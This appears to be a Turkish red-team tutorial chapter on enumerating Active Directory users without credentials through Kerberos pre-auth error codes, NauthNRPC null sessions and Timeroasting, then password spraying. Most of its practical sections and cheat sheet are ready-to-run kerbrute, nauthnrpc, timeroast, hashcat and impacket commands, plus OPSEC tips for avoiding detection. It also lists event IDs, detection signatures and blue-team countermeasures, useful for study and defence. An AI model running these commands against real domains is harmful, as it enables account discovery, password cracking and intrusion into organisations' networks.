## 1. Genel Bakış ve Mimari

Başarılı bir Password Spraying saldırısı ([02.2](./02.2_Password_Spraying.md)) veya AS-REP Roasting için en kritik gereksinim **doğrulanmış ve temiz bir kullanıcı listesidir**. Ancak sızma testinin ilk dakikalarında geçerli bir domain kullanıcısı bulunmadığında LDAP sorguları (`MaxPageSize`, `bindRequest`) doğrudan reddedilir.

Bu kör noktayı aşmak için Kerberos ve MSRPC protokollerinin tasarımındaki yan kanal (side-channel) sızıntıları kullanılır:

```
            [ Saldırgan Makinesi: Hiçbir Kimlik Bilgisi Yok ]
                                   │
              ┌────────────────────┴────────────────────┐
              ▼                                         ▼
     [ Kerberos AS-REQ (Port 88) ]            [ MS-NRPC (NauthNRPC) ]
     (Ön Kimlik Doğrulama Yan Kanalı)         (DsrGetDcNameEx2 NULL Session)
              │                                         │
              ├─► Hata 0x6: Kullanıcı Yok               └─► Domain Kullanıcı Adları
              ├─► Hata 0x19: Kullanıcı VAR! (Pre-auth)      Parola ve Log Olmadan
              └─► AS-REP Döner: Parola Korumasız!           Açık Metin Dökülür
```

* **Kerberos Pre-Authentication:** Bir kullanıcı adı KDC'ye (Domain Controller) sorulduğunda; kullanıcı varsa ve yoksa dönen RFC yanıt kodları birbirinden farklıdır. Bu işlemde **parola doğrulaması yapılmadığı için `badPwdCount` sayacı artmaz ve hesap asla kilitlenmez**.
* **Timeroasting:** NTP/SNTP protokolü üzerinden bilgisayar hesaplarının zaman eşitleme taleplerini taklit ederek Kerberos biletlerine dokunmadan makine parolası hash'lerini yakalama tekniğidir.

## 2. Teknik Derinlik ve Protokol Analizi

### 2.1 AS-REQ Pre-Auth Hata Kodları Analizi (RFC 4120)
Bir istemci Kerberos üzerinden bilet talep ettiğinde (`KRB_AS_REQ`), isteğin içinde ön kimlik doğrulama verisi (`padata - PA-ENC-TIMESTAMP`) bulunmazsa KDC şu mantıkla yanıt verir:

| KDC Yanıtı (Hata Kodu) | Onaltılık Kod | Anlamı ve Operasyonel Değeri |
| :--- | :--- | :--- |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | `0x06` | Kullanıcı etki alanında **mevcut değildir**. Listeden elenir. |
| `KDC_ERR_PREAUTH_REQUIRED` | `0x19 (25)` | Kullanıcı **kesinlikle mevcuttur** ve normal şekilde parola korumalıdır. Doğrulanmış kullanıcı listesine eklenir. |
| `KDC_ERR_PREAUTH_FAILED` | `0x18 (24)` | Kullanıcı mevcuttur; denenen parola **hatalıdır**. (`badPwdCount` artar!). |
| `KDC_ERR_CLIENT_REVOKED` | `0x12 (18)` | Kullanıcı mevcuttur ancak hesap **devre dışı (disabled)**, kilitli veya süresi dolmuştur. |
| `KDC_ERR_KEY_EXPIRED` | `0x17 (23)` | Kullanıcı mevcuttur; parolasının süresi dolmuştur (Expired). |
| `KRB_AS_REP` (Başarı) | `0x0B (11)` | Kullanıcı mevcuttur ve `DONT_REQ_PREAUTH` bayrağı açıktır! Şifreli TGT verisi döner → **AS-REP Roasting**. |

### 2.2 NauthNRPC — Yetkisiz MS-NRPC Kullanıcı Keşfi
Netlogon Remote Protocol (MS-NRPC), etki alanındaki bilgisayarların DC bulmasını sağlar:
* Windows Server sistemlerde `DsrGetDcNameEx2` RPC çağrısı, anonim / NULL session üzerinden çağrılabilir.
* `NauthNRPC` aracı, DC'ye herhangi bir kimlik bilgisi sunmadan yalnızca Netlogon RPC fonksiyonunu sorgulayarak etki alanındaki gerçek kullanıcı ve bilgisayar adlarını döker. Kerberos logu (`4768`) veya başarısız oturum açma (`4625`) üretmez.

### 2.3 Timeroasting Mimarisi ve SNTP İstismarı
Active Directory ortamlarında saat senkronizasyonu Kerberos biletlerinin geçerliliği için kritik öneme sahiptir (5 dakikalık tolerans):
* Windows istemciler ve etki alanı denetleyicileri zaman senkronizasyonu için **MS-SNTP** (RFC 2030 uzantısı) kullanır.
* Kimlik doğrulamalı SNTP taleplerinde istemci, bilgisayar hesabının NTLM hash'i ile bir MD5/HMAC imzası oluşturur.
* Saldırgan, DC'nin UDP 123 (NTP) servisine sahte zaman senkronizasyon paketleri göndererek DC'deki bilgisayar hesaplarının hash imzalarını çekebilir (**Timeroasting**). Elde edilen hash'ler `hashcat -m 31300` ile çevrimdışı kırılabilir.

## 3. Pratik Uygulama ve İleri Düzey Senaryolar

### Senaryo 1: Kerbrute ile Sıfır Riskli Kullanıcı Doğrulama (`userenum`)

```bash
# 1. Ham kelime listesinden geçerli kullanıcıları damıtma (Sıfır kilitlenme riski)
kerbrute userenum -d corp.local --dc 10.10.10.5 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 -o valid_users.txt

# 2. Çıktı Analizi:
# [+] VALID USERNAME:  ahmet.yilmaz@corp.local
# [+] VALID USERNAME:  mehmet.oz@corp.local
# [+] svc_backup@corp.local has no pre-auth required! AS-REP: $krb5asrep$23$...
```

> **Kritik Kazanç:** `userenum` sırasında `DONT_REQ_PREAUTH` açık bir hesap tespit edilirse, Kerbrute ek bir işlem yapmaya gerek kalmadan o kullanıcının AS-REP hash'ini konsola basar.

---

### Senaryo 2: NauthNRPC ile Kimliksiz ve Logsız Kullanıcı Dökümü

```bash
# 1. MS-NRPC üzerinden kimliksiz (null session) kullanıcı listesi çekme
python3 nauthnrpc.py -dc-ip 10.10.10.5 corp.local

# 2. Elde edilen kullanıcı listesini temizleyerek spray listesi haline getirme
cat nauth_output.txt | grep 'User:' | awk '{print $2}' > corp_users.txt
```

---

### Senaryo 3: Timeroasting ile Makine Hesabı Hash'lerini Çekme

```bash
# 1. Python timeroast aracı ile DC'ye NTP istekleri göndererek makine imzalarını yakalama
python3 timeroast.py 10.10.10.5 > timeroast_hashes.txt

# 2. Yakalanan hash formatı inceleme (Hashcat mode 31300)
head -n 5 timeroast_hashes.txt

# 3. Hashcat ile çevrimdışı kırma
hashcat -m 31300 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt -O
```

---

### Senaryo 4: Kerbrute ile Güvenli Parola Püskürtme (`passwordspray`)

```bash
# Damıtılmış geçerli kullanıcı listesine karşı kilitlenme korumalı spray
kerbrute passwordspray -d corp.local --dc 10.10.10.5 valid_users.txt 'Sonbahar2024!' --safe

# Tek bir zafiyetli hedefe yönelik kontrollü parola denemesi (bruteuser)
kerbrute bruteuser -d corp.local --dc 10.10.10.5 passwords.txt ahmet.yilmaz --safe
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Olası Kök Neden | Çözüm Adımı |
| :--- | :--- | :--- |
| `[!] Error: dial tcp 10.10.10.5:88: i/o timeout` | DC üzerinde port 88 (Kerberos) kapalı, firewall tarafından engelleniyor veya IP yanlış. | Portu doğrulayın: `nc -zvw3 10.10.10.5 88`. TCP yerine UDP trafiğini kontrol edin. |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN on all users` | Hedef etki alanı adı (`-d corp.local`) yanlış yazılmış veya büyük/küçük harf duyarlılığı sorunu var. | Etki alanı adını FQDN olarak ve büyük harflerle deneyin: `-d CORP.LOCAL`. |
| `KRB_AP_ERR_SKEW (Clock skew too great)` | Saldırı makinesi ile KDC arasındaki saat farkı 5 dakikadan fazladır. | `sudo ntpdate 10.10.10.5` veya `sudo date -s "$(curl -sI http://10.10.10.5 | grep -i Date: | cut -d' ' -f2-)"` ile eşitleyin. |
| `NauthNRPC: STATUS_ACCESS_DENIED` | Hedef DC üzerinde Windows güncellemeleri (KB5021130 / Netlogon RPC sealing) zorunlu kılınmıştır. | Kerberos tabanlı `kerbrute userenum` yöntemine geçiş yapın. |
| `Timeroast: No response from NTP server` | DC üzerinde UDP 123 portu ağ seviyesinde filtreleniyor veya Windows Time servisi devre dışı. | Zaman servisini doğrulamak için `sntp 10.10.10.5` çalıştırın; yanıt yoksa Kerbrute ile devam edin. |
| `Kerbrute: Rate limit / Connection reset by peer` | Ağ güvenlik cihazı (NGFW/IPS) saniyedeki yüksek Kerberos isteklerini SYN flood olarak algıladı. | İş parçacığı sayısını (`-t 10` veya `-t 5`) düşürün ve `--delay 100` ekleyin. |

## 5. Bıraktığı İz ve Karşı Tespit (OPSEC & Blue Eşleştirmesi)

### 5.1 Bıraktığı İzler (Artifacts & Telemetri)
* **Windows Security Event ID 4768 (A Kerberos authentication ticket (TGT) was requested):**
  * `Result Code: 0x6` → Kullanıcı adı bulunamadı (Enum izi).
  * `Result Code: 0x0` → Başarılı TGT talebi.
  * `Result Code: 0x12` → Hesap kilitli / devre dışı.
* **Windows Security Event ID 4771 (Kerberos pre-authentication failed):**
  * `Failure Code: 0x18` → Yanlış parola (Spray izi).

### 5.2 Ağ ve EDR İmzaları
* **TGT İstek Hacmi:** Tek bir kaynak IP adresinden kısa sürede yüzlerce farklı kullanıcı adına yönelik pre-auth verisi içermeyen `AS-REQ` istekleri KDC event loglarında anormal 4768 artışı üretir.
* **NTP Trafiği:** UDP 123 portuna doğru standart dışı MS-SNTP kontrol paketlerinin gönderilmesi NIDS tarafından tespit edilebilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Senaryosu |
| :--- | :--- | :--- |
| **[T1087.002](https://attack.mitre.org/techniques/T1087/002/)** | Account Discovery: Domain Account | Kerbrute ve NauthNRPC ile geçerli kullanıcı adlarını damıtma. |
| **[T1110.003](https://attack.mitre.org/techniques/T1110/003/)** | Brute Force: Password Spraying | Damıtılmış kullanıcı listesine Kerberos üzerinden parola püskürtme. |
| **[T1558.004](https://attack.mitre.org/techniques/T1558/004/)** | Steal or Forge Kerberos Tickets: AS-REP Roasting | Ön kimlik doğrulama kapalı hesapların hash'lerini yakalama. |

### 5.4 OPSEC Tavsiyeleri ve Savunma Karşılığı

| Kırmızı Takım Operatör Riski | OPSEC İyileştirme Adımı | Savunma (Blue Team) Karşı Tedbiri |
| :--- | :--- | :--- |
| Aşırı yüksek AS-REQ hacmiyle yakalanmak | İş parçacığı sayısını (`-t`) düşük tutun, isteklerin arasına rastgele gecikmeler ekleyin. | KDC üzerinde tek bir IP'den 1 dakikada gelen 4768 (Result Code 0x6) başarısızlıklarını korelasyonla izleyin. |
| Pre-auth kapalı hesapların tespiti | Çıkan AS-REP hash'lerini yerel makinede çevrimdışı kırın; DC'ye tekrar sorgu atmayın. | Domain genelinde tüm hesaplarda `Do not require Kerberos preauthentication` bayrağını kapatın. |
| Netlogon NULL session sızıntısı | MS-NRPC çağrılarını yalnızca iç ağdaki güvenilir hostlar üzerinden test edin. | Domain Controller sunucularında Netlogon RPC Sealing (CVE-2022-38023) güncellemesini zorunlu kılın. |

## 6. En Çok Kullanılan Komutlar (Hızlı Referans / Cheat Sheet)

```bash
# 1. Kerberos ile Hızlı ve Kilitlenmesiz Kullanıcı Keşfi (kerbrute)
kerbrute userenum -d corp.local --dc 10.10.10.5 users_wordlist.txt -t 20 -o valid_users.txt
# Ne Yapar?: Parola denemeden sadece var olan kullanıcıları KDC hata kodlarıyla damıtır.
# Ne Zaman Kullanılır?: Hedef etki alanında geçerli hesap isimleri bilinmediğinde.
# Parametreler: -d (domain), --dc (DC IP), -t (iş parçacığı sayısı), -o (çıktı dosyası).

# 2. Damıtılan Kullanıcılara Güvenli Parola Püskürtme
kerbrute passwordspray -d corp.local --dc 10.10.10.5 valid_users.txt 'Summer2024!' --safe
# Ne Yapar?: Yalnızca geçerli kullanıcılara tek parolayı dener; kilitlenme eşiğinde otomatik durur.
# Ne Zaman Kullanılır?: Kullanıcı listesi kesinleştikten sonra ilk foothold'u kazanmak için.

# 3. NauthNRPC ile Kimliksiz Netlogon Kullanıcı Dökümü
python3 nauthnrpc.py -dc-ip 10.10.10.5 corp.local
# Ne Yapar?: MS-NRPC NULL session üzerinden tüm domain kullanıcılarını log bırakmadan çeker.
# Ne Zaman Kullanılır?: Kerberos portları filtrelendiğinde veya tespit edilmek istenmediğinde.

# 4. Timeroasting ile Makine Parolası İmzalarını Çekme
python3 timeroast.py 10.10.10.5 > timeroast.hashes
# Ne Yapar?: NTP üzerinden bilgisayar hesaplarının şifreli zaman imzalarını yakalar.
# Ne Zaman Kullanılır?: Kullanıcı parolaları kırılamadığında makine hesaplarını hedeflemek için.

# 5. Yakalanan AS-REP Hash'ini Kırma (Hashcat Mod 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule -O
# Ne Yapar?: userenum sırasında ele geçen DONT_REQ_PREAUTH biletlerini GPU ile çözer.
# Ne Zaman Kullanılır?: Kerbrute çıktısında AS-REP hash düştüğünde.

# 6. Bulunan Kimliğin Biletini Talep Etme (Foothold Tescili)
impacket-getTGT 'corp.local/mehmet.oz:Summer2024!' -dc-ip 10.10.10.5
# Ne Yapar?: Doğrulanan kullanıcı için KDC'den resmi TGT bileti alır (.ccache dosyası üretir).
# Ne Zaman Kullanılır?: Yanal hareket ve LDAP keşif adımlarına geçmeden önce.
```
